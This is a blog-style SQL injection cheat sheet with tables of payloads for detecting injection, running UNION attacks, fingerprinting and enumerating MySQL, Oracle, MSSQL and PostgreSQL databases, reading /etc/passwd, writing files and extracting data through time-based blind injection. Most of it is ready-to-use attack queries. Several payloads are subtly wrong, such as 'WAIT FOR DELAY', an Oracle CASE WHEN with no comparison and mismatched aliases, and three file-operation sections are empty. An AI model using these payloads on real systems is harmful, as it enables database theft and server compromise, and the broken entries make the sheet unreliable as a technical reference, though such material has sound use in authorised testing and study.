---
layout: post
title:  "SQL injection wiki"
date:   2023-09-05 17:08:00 +0200
categories: wiki
sticky: true
permalink: /portfolio/wiki/sqli
---

* TOC
{:toc}

---

## What is SQL injection

A **SQL injection vulnerability** occurs when **unsanitized user input** is used inside a **SQL query**. It can occur in **login forms**, in search functionalities, or even in **HTTP headers**. This vulnerability can have several consequences, from private data being exfiltrated to **remote code execution**.

## How to detect

When a parameter that is used in a **SQL query** is found (such as a username in a login form) it can be tested to determine whether it is injectable or not. To do so one of the following payloads should be sent to verify it causes any error or behaviour change in the application:

| **Payload** | **URL encoded** |
|:-----------:|:---------------:|
|      \'     |       %27       |
|      \"     |       %22       |
|      #      |       %23       |
|      ;      |       %3B       |
|      )      |       %29       |

If an **error** occurs or the application's **behaviour changes**, then the parameter is **injectable**.

If **no error** occurs and the application's **behaviour does not change**, the parameter may still be vulnerable to **blind SQL injection** vulnerabilities.

## UNION attack

If the output of a query is **visible** and there is an injectable parameter, **UNION attacks** are possible. However, some information has to be found.

### Finding out the number of columns

First of all, the number of columns returned by the query must be found.
There are two ways to do so:
1. Using the **ORDER BY** clause incrementally (*i.e.* injecting **ORDER BY 1**, then **ORDER BY 2**, then **ORDER BY 3**, ...) until an error occurs or the application does not show any output. The **last successful index** used is the number of columns returned by the query.
2. Using **UNION** incrementally (*i.e.* injecting **UNION NULL**, then **UNION NULL, NULL**, then **UNION NULL, NULL, NULL**, ...). The number of **NULLS** in the first (and only) successful query is the number of columns returned by the query.

After finding out how many columns are returned by the query it is necessary to determine which columns are shown on the **front-end**. To do so, junk data (such as **1** or **\'a\'**) may be used in each column and the front-end must be observed to determine **which** junk data is shown.

### Fingerprinting

Usually, if the webserver runs **Apache** or **Nginx** it is often running on **Linux**, therefore the **DBMS** is likely to be **MySQL**. The same applies to **IIS** webserver usually running **MSSQL** on **Windows**. However this is not always the case.

The following queries may be tried to infer the type of **DBMS** being attacked.

#### MySQL

|    **Payload**   |          **When to use**         | **Expected output** | **Wrong output** |
|:----------------:|:--------------------------------:|:-------------------:|:----------------:|
| SELECT @@version |  Full query output is available  |     DBMS version    |       Error      |
| SELECT POW(1, 1) | Only numeric output is available |          1          |       Error      |
|  SELECT SLEEP(5) |       Output is not visible      |  0 after 5 seconds  |     No delay     |

#### Oracle

|                          **Payload**                          |          **When to use**         | **Expected output**   | **Wrong output** |
|:-------------------------------------------------------------:|:--------------------------------:|-----------------------|------------------|
| SELECT banner FROM v$version; SELECT version FROM v$instance; |  Full query output is available  |      DBMS version     |       Error      |
|                          BITAND(1, 1)                         | Only numeric output is available |           1           |       Error      |
|    SELECT dbms_pipe.receive_message((\'a\'), 5) FROM dual;    |       Output is not visible      | \'a\' after 5 seconds |       Error      |

#### Microsoft SQL Server

|        **Payload**        |          **When to use**         | **Expected output** | **Wrong output** |
|:-------------------------:|:--------------------------------:|---------------------|------------------|
|      SELECT @@version     |  Full query output is available  |     DBMS version    |       Error      |
|         SQUARE(1)         | Only numeric output is available |          1          |       Error      |
| WAITFOR DELAY \'0\:0\:5\' |       Output is not visible      |   5 seconds delay   |       Error      |

#### PostgreSQL

|        **Payload**       |          **When to use**         | **Expected output** | **Wrong output** |
|:------------------------:|:--------------------------------:|---------------------|------------------|
|     SELECT version()     |  Full query output is available  |     DBMS version    |       Error      |
| SELECT 1/(1-pg_sleep(0)) | Only numeric output is available |          1          |       Error      |
|    SELECT pg_sleep(5)    |       Output is not visible      |   5 seconds delay   |       Error      |

### Enumeration

#### MySQL

|        **Effect**       |                                                   **Query**                                                   |
|:-----------------------:|:-------------------------------------------------------------------------------------------------------------:|
|      List databases     |                              SELECT schema_name FROM information_schema.schemata;                             |
|  Print current database |                                               SELECT database();                                              |
|       List tables       |                        SELECT table_schema, table_name FROM information_schema.tables;                        |
| List columns in a table | SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name=\'TABLE_NAME\'; |
|    Print current user   |                       SELECT user(); SELECT current_user(); SELECT user FROM mysql.user;                      |
|    Is user superadmin   |                          SELECT super_priv FROM mysql.user WHERE user=\'USER_NAME\';                          |
|   Dump user privileges  |      SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee=\'USER_NAME\';      |


#### Oracle

|        **Effect**       |                                                            **Query**                                                           |
|:-----------------------:|:------------------------------------------------------------------------------------------------------------------------------:|
|      List databases     |                                                               N/A                                                              |
|  Print current database |                                  SELECT * FROM v$database; SELECT ora_database_name FROM dual;                                 |
|       List tables       |                                                    SELECT * FROM all_tables;                                                   |
| List columns in a table |                                SELECT * FROM all_tab_columns WHERE table_name = \'TABLE_NAME\';                                |
|    Print current user   |                                     SELECT user FROM dual; SELECT username FROM v$session;                                     |
|    Is user superadmin   | SELECT * FROM SESSION_ROLES WHERE role=\'DBA\'; SELECT * FROM v$pwfile_users WHERE username=\'USER_NAME\' AND SYSDBA=\'TRUE\'; |
|   Dump user privileges  |                                  SELECT * FROM USER_ROLE_PRIVS; SELECT * FROM USER_SYS_PRIVS;                                  |


#### Microsoft SQL server

|        **Effect**       |                                                                                                        **Query**                                                                                                       |
|:-----------------------:|:----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
|      List databases     |                                                                                             SELECT name FROM sys.databases;                                                                                            |
|  Print current database |                                                                                                    SELECT db_name();                                                                                                   |
|       List tables       |                                                                             SELECT table_schema, table_name FROM information_schema.tables;                                                                            |
| List columns in a table |                                                      SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name=\'TABLE_NAME\';                                                     |
|    Print current user   |                                                                                                  SELECT current_user;                                                                                                  |
|    Is user superadmin   |                                                                                         SELECT is_srvrolemember(\'sysadmin\');                                                                                         |
|   Dump user privileges  | SELECT dp_principal.name, dp.permission_name FROM sys.database_permissions dp JOIN sys.database_principals dp_principals ON dp.grantee_principal_id = dp_principal.principal_id WHERE dp_principal.name=\'USER_NAME\'; |

#### PostgreSQL

|        **Effect**       |                                                   **Query**                                                   |
|:-----------------------:|:-------------------------------------------------------------------------------------------------------------:|
|      List databases     |                                        SELECT datname FROM pg_database;                                       |
|  Print current database |                                           SELECT current_database();                                          |
|       List tables       |                        SELECT table_schema, table_name FROM information_schema.tables;                        |
| List columns in a table | SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name=\'TABLE_NAME\'; |
|    Print current user   |                                              SELECT current_user;                                             |
|    Is user superadmin   |                           SELECT rolsuper FROM pg_roles WHERE rolname=\'USER_NAME\';                          |
|   Dump user privileges  |     SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE grantee=\'USER_NAME\';     |

### File operations

#### MySQL

If the user has the **FILE** privilege they may **read files** from the underlying filesystem. To be able to **write files**, however, the global variable **secure_file_priv** must also not be enabled.

An empty **secure_file_priv** variable (*i.e.* **\'\'**) allows file operations **everywhere**. If a directory is set, file operations are only allowed in **such directory**. A **NULL secure_file_priv** variable **forbids** reads/writes **anywhere**.

|            **Effect**            |                                                                           **Query**                                                                           |
|:--------------------------------:|:-------------------------------------------------------------------------------------------------------------------------------------------------------------:|
|             Read file            |                                                                SELECT LOAD_FILE(\'/etc/passwd\');                                                               |
| Determine secure_file_priv value | SHOW VARIABLES LIKE \'secure_file_priv\'; <br> SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name=\'secure_file_priv\'; |
|           Write to file          |                                                            SELECT \"Hello World!\" INTO OUTFILE \'/path/to/file\';                                                           |

#### Oracle



#### Microsoft SQL server



#### PostgreSQL


## Blind SQL injection

A SQL injection is **blind** whenever the front-end does not show the query's output directly.

### Time-based blind SQL injection

To detect a **time-based** blind SQL injection it is necessary to inject the following queries.

|       **DBMS**       |                      **Payload**                      | **Expected output** |
|:--------------------:|:-----------------------------------------------------:|:-------------------:|
|         MySQL        |                      1-SLEEP(10);                     |   Delayed response  |
|        Oracle        | AND 1=DBMS_PIPE.RECEIVE_MESSAGE(\'a\', 10) FROM dual; |   Delayed response  |
| Microsoft SQL Server |            1; WAIT FOR DELAY \'00:00:10\';            |   Delayed response  |
|      PostgreSQL      |                    ; pg_sleep(10);                    |   Delayed response  |

Oracle is not really vulnerable to this kind of vulnerability. If it is, the only possible option is to use the **PL/SQL SLEEP** function, but it is rarely enabled.

If a delayed response is observed, time delays can also be used to infer information based on **boolean conditions**. Usually, to extract **string-type data** it is necessary to check each character incrementally.

|       **DBMS**       |                                                     **Payload**                                                     |    **Expected output**     |
|:--------------------:|:-------------------------------------------------------------------------------------------------------------------:|:--------------------------:|
|         MySQL        |                                   1-IF(MID(version(), 1, 1) = '5', SLEEP(5), 0);                                    |   Delayed response if true |
|        Oracle        | AND \'a\' = (SELECT CASE WHEN SUBSTR(user, 1, 1) THEN DBMS_PIPE.RECEIVE_MESSAGE(\'a\', 5) ELSE NULL END FROM dual); |   Delayed response if true |
| Microsoft SQL Server |                         IF (SUBSTRING(DB_NAME(), 1, 1) = \'a\') WAIT FOR DELAY \'00:00:05\';                        |   Delayed response if true |
|      PostgreSQL      |             ; SELECT CASE WHEN (SUBSTRING(version(), 1, 1) = '1') THEN pg_sleep(5) ELSE pg_sleep(0) END;            |   Delayed response if true |

